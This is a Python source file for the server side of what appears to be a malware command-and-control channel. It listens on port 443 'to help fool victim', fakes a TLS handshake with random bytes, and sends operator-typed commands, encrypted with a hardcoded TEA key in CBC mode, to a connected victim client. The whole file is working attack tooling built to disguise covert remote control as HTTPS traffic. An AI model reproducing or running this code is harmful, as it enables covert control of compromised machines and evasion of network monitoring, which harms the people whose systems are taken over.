import random
from ctypes import c_uint
from socket import *

# TEA based on http://www.cs.sjsu.edu/~stamp/CS265/SecurityEngineering/chapter5_SE/tea
# FakeTLS based on https://medium.com/@raykaryshyn/an-implementation-of-faketls-85b94f496d72

ip = "localhost" # change this IP
port = 443 # HTTPS port to help fool victim

K = [0x77652061, 0x72652072, 0x3373652d, 0x72636821] # TEA key
magic = 0x9e3779b9 # TEA magic constant
bn = 0 # number of blocks

def serverhello(connectionSocket: socket):
    '''
    Send server hello to client through connectionSocket
    Param connectionSocket: socket connected to client from main
    '''
    aa = bytes([0x16, 0x03, 0x03, 0x00, 0x7a, 0x02, 0x00, 0x00, 0x76, 0x03, 0x03]) # record header, handshake header, and server version
    ab = random.randbytes(32) # server random: random bytes used later in a normal TLS session
    ac = bytes([0x20]) # 0x20 bytes of session ID follow
    ad = random.randbytes(32) # made up session ID
    ae = bytes([0x13, 0x02, 0x00, 0x00, 0x2e, 0x00, 0x2b, 0x00, 0x02, 0x03, 0x04, 0x00, 0x33, 0x00, 0x24, 0x00, 0x1d, 0x00, 0x20]) # extension info
    af = random.randbytes(32) # made up public key
    a = aa + ab + ac + ad + ae + af # server hello
    connectionSocket.send(a)

    ba = bytes([0x17, 0x03, 0x03, 0x00, 0x17])
    bb = random.randbytes(23)
    b = ba + bb # fake server encrypted extensions data
    connectionSocket.send(b)

    ca = bytes([0x17, 0x03, 0x03, 0x03, 0x43])
    cb = random.randbytes(835)
    c = ca + cb # fake server certificate data
    connectionSocket.send(c)

    da = bytes([0x17, 0x03, 0x03, 0x01, 0x19])
    db = random.randbytes(281)
    d = da + db # fake server certificate verify data
    connectionSocket.send(d)

    ea = bytes([0x17, 0x03, 0x03, 0x00, 0x45])
    eb = random.randbytes(69)
    e = ea + eb # fake server handshake finished data
    connectionSocket.send(e)

def tobytes(ciphers: list[list[int]]) -> bytes:
    '''
    Returns byte representation of the list of tuples of ints
    Param ciphers: list of tuples of ints representing ciphertext
    '''
    out = b''
    for x in range(0,len(ciphers)):
        out += ciphers[x][0].to_bytes(4, 'big') + ciphers[x][1].to_bytes(4, 'big')
    return out

def encrypt(command: list[int], previous: list[int]) -> list[int]: # TEA encryption
    '''
    Returns tuple of ints representing ciphertext block
    Param command: tuple of ints representing plaintext block
    Param previous: tuple of ints representing previous ciphertext block or IV
    '''
    L = c_uint(command[0] ^ previous[0]) # L, R, and sum are 32 bit
    R = c_uint(command[1] ^ previous[1]) # xor due to CBC mode
    sum = c_uint()
    for x in range(0,32): # 32 rounds are recommended
        sum.value += magic
        L.value += ((R.value << 4) + K[0]) ^ (R.value + sum.value) ^ ((R.value >> 5) + K[1])
        R.value += ((L.value << 4) + K[2]) ^ (L.value + sum.value) ^ ((L.value >> 5) + K[3])
    return [L.value, R.value]

def cbc(command: str) -> bytes:
    '''
    Returns bytes representing TEA encryted ciphertext
    Param command: padded input string plaintext
    '''
    global bn
    ciphers = [[random.randint(0,0xffffffff), random.randint(0, 0xffffffff)]] # iv is chosen at random and added to start of ciphertext
    for x in range(0,bn):
        ciphers.append(encrypt([int.from_bytes(command[8*x:8*x+4].encode(), 'big'), int.from_bytes(command[8*x+4:8*x+8].encode(), 'big')], ciphers[x]))
    return tobytes(ciphers)

def main():
    '''
    Waits for client connection, then allows user to send commands to client
    '''
    global bn
    serverSocket = socket(AF_INET, SOCK_STREAM)
    serverSocket.bind((ip, port))
    serverSocket.listen(1)
    try:
        connectionSocket, clientAddress = serverSocket.accept()
    except:
        print("No connection")
    connectionSocket.recv(2048) # receive and discard client hello
    serverhello(connectionSocket)
    connectionSocket.recv(2048) # receive and discard client handshake finished
    while True:
        command = input("Input command (type:parameter):") # prompt for command with format command:parameter
        comlen = len(command) # length of command
        if comlen > 128:
            print("Command exceeds length")
            continue
        bn = (comlen // 8) + (comlen % 8 > 0) # sets block number to ceiling of comlen / 8
        padded = (command + ":").ljust(8*bn, " ") # append : to end of command to separate from padding and pad command to fit blocks
        ciphercmd = cbc(padded) # encrypt command with TEA CBC
        connectionSocket.send(ciphercmd) # send to client

if __name__ == "__main__":
    main()
